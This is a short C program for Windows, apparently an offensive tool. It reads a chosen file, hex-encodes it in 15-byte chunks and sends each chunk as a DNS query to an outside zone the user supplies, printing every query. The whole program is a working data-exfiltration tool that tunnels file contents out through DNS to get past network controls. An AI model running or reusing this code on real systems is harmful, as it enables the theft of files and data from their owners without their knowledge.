#include <windows.h>
#include <windns.h>
#include <stdio.h>

/*
 cl /c dns_upload.c
 link dns_upload.obj dnsapi.lib
*/

void main(int argc, char **argv)
{
	if(argc != 3)
	{
		printf("%s path/to/file zone.tk\n", argv[0]);
		return;
	}
	FILE *f = fopen(argv[1],"rb");
	unsigned char *content;
	unsigned char *dns;
	unsigned int i,j,bytes;
	bytes = 0;
	PDNS_RECORD result;

	content = malloc(15);
	dns = malloc(50);

	while(!feof(f))
	{
		j = 0;
		memset(dns, '\x00', 50);
		j += sprintf(dns, "%d.", bytes);
		fread(content, 1, 15, f);
		for(i = 0; i < 15; i++)
			j += sprintf(dns+j, "%02x", content[i]);
		sprintf(dns+j, ".%s", argv[2]);
		printf("%s\n", dns);
		DnsQuery_A(dns, DNS_TYPE_A, DNS_QUERY_STANDARD, 0, &result, 0);
		Sleep(100);
		bytes += 15;
	}
}